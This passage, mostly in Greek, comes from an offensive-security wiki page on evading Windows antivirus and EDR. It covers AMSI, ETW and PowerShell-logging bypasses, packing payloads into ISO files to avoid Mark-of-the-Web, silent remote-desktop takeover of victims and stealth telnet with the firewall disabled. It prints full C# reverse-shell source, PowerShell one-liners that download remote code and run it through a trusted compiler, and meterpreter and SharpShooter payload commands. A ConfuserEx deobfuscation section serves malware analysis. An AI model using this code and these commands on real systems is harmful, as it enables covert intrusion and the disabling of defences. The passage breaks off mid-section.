Το tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** δημιουργεί επίσης script για την παράκαμψη του AMSI.
Το tool **[https://amsibypass.com/](https://amsibypass.com/)** δημιουργεί επίσης script για την παράκαμψη του AMSI, το οποίο αποφεύγει το signature χρησιμοποιώντας randomized user-defined function, variables, character expression και εφαρμόζοντας random character casing στα keywords του PowerShell για την αποφυγή του signature.

**Αφαίρεση του detected signature**

Μπορείτε να χρησιμοποιήσετε ένα tool όπως τα **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε το detected AMSI signature από τη μνήμη του τρέχοντος process. Αυτό το tool λειτουργεί σαρώνοντας τη μνήμη του τρέχοντος process για το AMSI signature και στη συνέχεια αντικαθιστώντας το με NOP instructions, αφαιρώντας το ουσιαστικά από τη μνήμη.

**Προϊόντα AV/EDR που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με προϊόντα AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρήση της έκδοσης 2 του PowerShell**
Αν χρησιμοποιείτε την έκδοση 2 του PowerShell, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:
```bash
powershell.exe -version 2
```
## PS Logging

Το PowerShell logging είναι μια δυνατότητα που επιτρέπει την καταγραφή όλων των εντολών PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς auditing και troubleshooting, αλλά μπορεί επίσης να αποτελέσει **πρόβλημα για attackers που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε το PowerShell logging, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως το [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) για αυτόν τον σκοπό.
- **Use Powershell version 2**: Αν χρησιμοποιήσετε PowerShell version 2, το AMSI δεν θα φορτωθεί, επομένως μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής: `powershell.exe -version 2`
- **Use an unmanaged PowerShell session**: Χρησιμοποιήστε το [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να φιλοξενήσετε το PowerShell χωρίς να εκκινήσετε το `powershell.exe` (η προσέγγιση που χρησιμοποιεί το `powerpick` του Cobalt Strike). Αυτό παρακάμπτει controls που συνδέονται ειδικά με τη διεργασία `powershell.exe`, αλλά δεν απενεργοποιεί εγγενώς το AMSI, το Script Block Logging ή κάθε άλλη άμυνα του PowerShell· η κάλυψη εξαρτάται από το runtime και την υλοποίηση του host.


## Obfuscation

> [!TIP]
> Αρκετές τεχνικές obfuscation βασίζονται στην κρυπτογράφηση δεδομένων, η οποία αυξάνει το entropy του binary και διευκολύνει τον εντοπισμό του από AVs και EDRs. Να είστε προσεκτικοί και ίσως να εφαρμόζετε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή πρέπει να παραμείνουν κρυφά.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Κατά την ανάλυση malware που χρησιμοποιεί το ConfuserEx 2 (ή commercial forks), είναι συνηθισμένο να αντιμετωπίζετε πολλά επίπεδα προστασίας που εμποδίζουν τους decompilers και τα sandboxes. Η παρακάτω διαδικασία **επαναφέρει ένα σχεδόν αρχικό IL**, το οποίο στη συνέχεια μπορεί να γίνει decompile σε C# με εργαλεία όπως τα dnSpy ή ILSpy.<sup>[[10]](#references)</sup>

1.  Αφαίρεση anti-tampering – Το ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor (`<Module>.cctor`) του *module*. Επίσης τροποποιεί το PE checksum, έτσι ώστε οποιαδήποτε αλλαγή να προκαλεί crash του binary. Χρησιμοποιήστε το **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες metadata, να ανακτήσετε τα XOR keys και να ξαναγράψετε ένα καθαρό assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Η έξοδος περιέχει τις 6 anti-tamper παραμέτρους (`key0-key3`, `nameHash`, `internKey`), οι οποίες μπορεί να είναι χρήσιμες κατά τη δημιουργία του δικού σας unpacker.

2.  Ανάκτηση symbols / control-flow – Δώστε το *clean* αρχείο στο **de4dot-cex** (ένα fork του de4dot που υποστηρίζει το ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – επιλέγει το profile του ConfuserEx 2
• Το de4dot αναιρεί το control-flow flattening, επαναφέρει τα αρχικά namespaces, classes και variable names και αποκρυπτογραφεί τα constant strings.

3.  Αφαίρεση proxy calls – Το ConfuserEx αντικαθιστά τις άμεσες method calls με lightweight wrappers (γνωστά και ως *proxy calls*) για να δυσκολέψει περαιτέρω το decompilation. Αφαιρέστε τα με το **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να βλέπετε κανονικά .NET APIs, όπως `Convert.FromBase64String` ή `AES.Create()`, αντί για opaque wrapper functions (`Class8.smethod_10`, …).

4.  Χειροκίνητο clean-up – Εκτελέστε το binary που προέκυψε στο dnSpy και αναζητήστε μεγάλα Base64 blobs ή χρήση των `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *real* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς να χρειάζεται να εκτελέσετε το malicious sample** – χρήσιμο όταν εργάζεστε σε offline workstation.

> 🛈  Το ConfuserEx δημιουργεί ένα custom attribute με το όνομα `ConfusedByAttribute`, το οποίο μπορεί να χρησιμοποιηθεί ως IOC για την αυτόματη ταξινόμηση samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Στόχος αυτού του project είναι να παρέχει ένα open-source fork της [LLVM](http://www.llvm.org/) compilation suite, ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και προστασίας από παραποίηση.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιείτε τη γλώσσα `C++11/14` για τη δημιουργία obfuscated κώδικα κατά το compile time, χωρίς τη χρήση εξωτερικού εργαλείου και χωρίς τροποποίηση του compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο obfuscated operations που δημιουργούνται από το C++ template metaprogramming framework, γεγονός που δυσκολεύει λίγο περισσότερο τη ζωή όποιου θέλει να κάνει crack στην εφαρμογή.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να κάνει obfuscate διάφορα pe files, όπως: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι ένας απλός metamorphic code engine για arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα fine-grained code obfuscation framework για LLVM-supported languages, το οποίο χρησιμοποιεί ROP (return-oriented programming). Το ROPfuscator κάνει obfuscate ένα πρόγραμμα σε επίπεδο assembly code, μετατρέποντας τις κανονικές instructions σε ROP chains και ματαιώνοντας τη φυσική μας αντίληψη για το normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Ίσως έχετε δει αυτή την οθόνη κατά τη λήψη ορισμένων executables από το internet και την εκτέλεσή τους.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που έχει σχεδιαστεί για να προστατεύει τον τελικό χρήστη από την εκτέλεση δυνητικά κακόβουλων εφαρμογών.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με reputation-based προσέγγιση, πράγμα που σημαίνει ότι εφαρμογές που έχουν ληφθεί σπάνια θα ενεργοποιήσουν το SmartScreen, ειδοποιώντας έτσι και αποτρέποντας τον τελικό χρήστη από την εκτέλεση του file (αν και το file μπορεί να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

Το **MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier, το οποίο δημιουργείται αυτόματα κατά τη λήψη files από το internet, μαζί με το URL από το οποίο έγινε η λήψη.

<figure><img src="../images/image (237).png" alt=""><figcaption>Έλεγχος του Zone.Identifier ADS για ένα file που λήφθηκε από το internet.</figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι executables που έχουν υπογραφεί με **trusted** signing certificate **δεν θα ενεργοποιήσουν το SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψετε τα payloads σας από το να αποκτήσουν Mark of The Web είναι να τα συσκευάσετε μέσα σε κάποιο είδος container, όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **δεν μπορεί** να εφαρμοστεί σε volumes που **δεν είναι NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα tool που συσκευάζει payloads σε output containers για να παρακάμπτει το Mark-of-the-Web.

Παράδειγμα χρήσης:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ακολουθεί ένα demo για το bypass του SmartScreen με τη συσκευασία payloads μέσα σε αρχεία ISO χρησιμοποιώντας το [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός logging στα Windows, ο οποίος επιτρέπει στις εφαρμογές και στα system components να **καταγράφουν events**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από security products για την παρακολούθηση και τον εντοπισμό κακόβουλων ενεργειών.

Όπως το AMSI απενεργοποιείται (bypassed), είναι επίσης δυνατό να κάνουμε τη συνάρτηση **`EtwEventWrite`** της user space διεργασίας να επιστρέφει αμέσως χωρίς να καταγράφει events. Αυτό γίνεται με patching της συνάρτησης στη μνήμη ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά το ETW logging για τη συγκεκριμένη διεργασία.

Μπορείτε να βρείτε περισσότερες πληροφορίες στα **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) και [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Η φόρτωση C# binaries στη μνήμη είναι γνωστή εδώ και αρκετό καιρό και εξακολουθεί να αποτελεί έναν πολύ καλό τρόπο για την εκτέλεση των post-exploitation tools σας χωρίς να εντοπίζονται από το AV.

Καθώς το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει τον δίσκο, θα πρέπει να ανησυχούμε μόνο για το patching του AMSI για ολόκληρη τη διεργασία.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc κ.λπ.) παρέχουν ήδη τη δυνατότητα εκτέλεσης C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι για να γίνει αυτό:

- **Fork\&Run**

Περιλαμβάνει το **spawning μιας νέας sacrificial διεργασίας**, το injection του post-exploitation malicious code σας στη νέα διεργασία, την εκτέλεση του malicious code και, όταν ολοκληρωθεί, το kill της νέας διεργασίας. Αυτό έχει τόσο πλεονεκτήματα όσο και μειονεκτήματα. Το πλεονέκτημα της μεθόδου fork and run είναι ότι η εκτέλεση πραγματοποιείται **εκτός** της διεργασίας του Beacon implant μας. Αυτό σημαίνει ότι, αν κάτι πάει στραβά ή εντοπιστεί κατά τη διάρκεια της post-exploitation ενέργειάς μας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **επιβιώσει το implant**. Το μειονέκτημα είναι ότι υπάρχει **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για την έγχυση του post-exploitation malicious code **στη δική του διεργασία**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία μιας νέας διεργασίας και το scanning της από το AV, αλλά το μειονέκτημα είναι ότι, αν κάτι πάει στραβά κατά την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon** επειδή μπορεί να καταρρεύσει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για το C# Assembly loading, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **από το PowerShell**. Δείτε τα [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και [το video του S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε malicious code χρησιμοποιώντας άλλες γλώσσες, παρέχοντας στο compromised machine πρόσβαση **στο interpreter environment που είναι εγκατεστημένο στο Attacker Controlled SMB share**.

Επιτρέποντας την πρόσβαση στα Interpreter Binaries και στο environment μέσω του SMB share, μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες μέσα στη μνήμη** του compromised machine.

Το repo αναφέρει: Το Defender εξακολουθεί να κάνει scanning στα scripts, αλλά αξιοποιώντας Go, Java, PHP κ.λπ. έχουμε **μεγαλύτερη ευελιξία για bypass static signatures**. Οι δοκιμές με τυχαία, μη obfuscated reverse shell scripts σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## TokenStomping

Το Token stomping χειρίζεται το access token ενός security product, όπως ένα EDR ή AV. Η μείωση των privileges του token μπορεί να αφήσει τη διεργασία σε εκτέλεση, εμποδίζοντάς την παράλληλα να πραγματοποιεί privileged inspection ή remediation actions.

Για να το αποτρέψουν αυτό, τα Windows θα μπορούσαν να **εμποδίζουν εξωτερικές διεργασίες** από το να αποκτούν handles πάνω στα tokens των security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτό το blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να κάνετε deploy το Chrome Remote Desktop σε ένα victim PC και στη συνέχεια να το χρησιμοποιήσετε για takeover και διατήρηση persistence:<sup>[[35]](#references)</sup>
1. Κάντε download από το https://remotedesktop.google.com/, κάντε click στο "Set up via SSH" και στη συνέχεια κάντε click στο MSI file για Windows, ώστε να κάνετε download το MSI file.
2. Εκτελέστε σιωπηλά τον installer στο victim (απαιτούνται δικαιώματα admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε click στο next. Στη συνέχεια, ο wizard θα σας ζητήσει authorization. Κάντε click στο κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παρεχόμενη εντολή με τις απαιτούμενες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (η παράμετρος `--pin` ορίζει το PIN χωρίς τη χρήση του GUI).


## Advanced Evasion

Το Evasion είναι ένα πολύ περίπλοκο θέμα. Μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε ένα μόνο system, επομένως είναι πρακτικά αδύνατο να παραμείνετε εντελώς undetected σε mature environments.

Κάθε environment απέναντι στο οποίο επιχειρείτε θα έχει τα δικά του strengths και weaknesses.

Σας προτείνω ανεπιφύλακτα να παρακολουθήσετε αυτή την ομιλία από τον [@ATTL4S](https://twitter.com/DaniLJ94), ώστε να αποκτήσετε μια πρώτη εικόνα για πιο Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία από τον [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με το Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο θα **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί malicious το Defender** και θα σας το διαχωρίσει.\
Ένα άλλο tool που κάνει το **ίδιο πράγμα είναι το** [**avred**](https://github.com/dobin/avred), με μια open web προσφορά της υπηρεσίας στη διεύθυνση [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows 10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) εκτελώντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάντε το να **ξεκινά** όταν εκκινείται το σύστημα και **εκτελέστε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή θύρας telnet** (stealth) και απενεργοποίηση firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)

**ΣΤΟ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Στη συνέχεια, μετακινήστε το binary _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** πρέπει να **εκτελέσει μέσα** στο **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμος** να δεχτεί μια reverse **VNC connection**. Στη συνέχεια, μέσα στο **victim**: Εκκινήστε το winvnc daemon με `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε το stealth, δεν πρέπει να κάνετε ορισμένα πράγματα

- Μην εκκινήσετε το `winvnc` αν εκτελείται ήδη,否则 θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην εκκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο φάκελο,否则 θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελέσετε το `winvnc -h` για βοήθεια,否则 θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **εκκινήστε το lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

Μεταγλωττίστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# με χρήση compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα με C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση Python για τη δημιουργία injectors, παράδειγμα:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Τερματισμός AV/EDR από τον χώρο του Kernel

Το Storm-2603 αξιοποίησε ένα μικρό console utility, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις endpoint protections πριν από την ανάπτυξη ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *υπογεγραμμένο* driver** και τον καταχράται για την εκτέλεση προνομιούχων kernel operations, τις οποίες δεν μπορούν να αποκλείσουν ούτε οι υπηρεσίες AV τύπου Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Βασικά συμπεράσματα
